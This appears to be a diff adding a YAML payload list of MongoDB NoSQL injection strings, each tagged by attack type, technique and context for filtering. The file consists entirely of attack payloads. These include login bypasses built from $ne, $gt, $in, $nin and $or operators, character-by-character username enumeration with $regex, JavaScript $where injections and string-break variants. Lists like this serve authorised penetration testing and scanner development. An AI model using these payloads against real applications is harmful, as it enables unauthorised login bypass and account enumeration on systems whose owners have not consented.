@@ -1,0 +1,105 @@
+# NoSQL Injection Payloads with Metadata
+# Usage: Filter by dbms, type, and context
+
+payloads:
+  # Authentication bypass - operator injection
+  - payload: '{"username": {"$ne": ""}, "password": {"$ne": ""}}'
+    type: auth-bypass
+    dbms: mongodb
+    context: [login, authentication]
+    technique: operator-injection
+
+  - payload: '{"username": {"$gt": ""}, "password": {"$gt": ""}}'
+    type: auth-bypass
+    dbms: mongodb
+    context: [login, authentication]
+    technique: operator-injection
+
+  - payload: '{"username": {"$in": ["admin", "root"]}, "password": {"$ne": ""}}'
+    type: auth-bypass
+    dbms: mongodb
+    context: [login, authentication, targeted]
+    technique: operator-injection
+
+  - payload: '{"username": {"$exists": true}, "password": {"$exists": true}}'
+    type: auth-bypass
+    dbms: mongodb
+    context: [login, enumeration]
+    technique: operator-injection
+
+  # Regex-based enumeration
+  - payload: '{"username": {"$regex": "admin.*"}, "password": {"$ne": ""}}'
+    type: enumeration
+    dbms: mongodb
+    context: [login, username-enumeration]
+    technique: regex-injection
+
+  - payload: '{"username": {"$regex": "^a"}}'
+    type: enumeration
+    dbms: mongodb
+    context: [username-enumeration, character-brute]
+    technique: regex-injection
+
+  - payload: '{"username": {"$regex": "^ad"}}'
+    type: enumeration
+    dbms: mongodb
+    context: [username-enumeration, character-brute]
+    technique: regex-injection
+
+  - payload: '{"username": {"$regex": "^adm"}}'
+    type: enumeration
+    dbms: mongodb
+    context: [username-enumeration, character-brute]
+    technique: regex-injection
+
+  # JavaScript injection
+  - payload: '{"$where": "this.username == ''admin''"}'
+    type: javascript-injection
+    dbms: mongodb
+    context: [query-manipulation]
+    technique: where-injection
+
+  - payload: '{"$where": "function() { return true; }"}'
+    type: javascript-injection
+    dbms: mongodb
+    context: [auth-bypass, always-true]
+    technique: where-injection
+
+  # Negation bypass
+  - payload: '{"username": {"$nin": ["invalid"]}, "password": {"$nin": ["invalid"]}}'
+    type: auth-bypass
+    dbms: mongodb
+    context: [login, authentication]
+    technique: negation-bypass
+
+  # String injection variants
+  - payload: "true, $where: '1 == 1'"
+    type: string-injection
+    dbms: mongodb
+    context: [inline-query, string-context]
+    technique: string-break
+
+  - payload: ", $where: '1 == 1'"
+    type: string-injection
+    dbms: mongodb
+    context: [inline-query]
+    technique: string-break
+
+  - payload: "$where: '1 == 1'"
+    type: string-injection
+    dbms: mongodb
+    context: [inline-query]
+    technique: string-break
+
+  - payload: "'; return '' == '"
+    type: string-injection
+    dbms: mongodb
+    context: [javascript-string]
+    technique: string-escape
+
+  # OR injection
+  - payload: '{"$or": [{"username": "admin"}, {"username": {"$ne": ""}}]}'
+    type: auth-bypass
+    dbms: mongodb
+    context: [login, authentication]
+    technique: or-injection
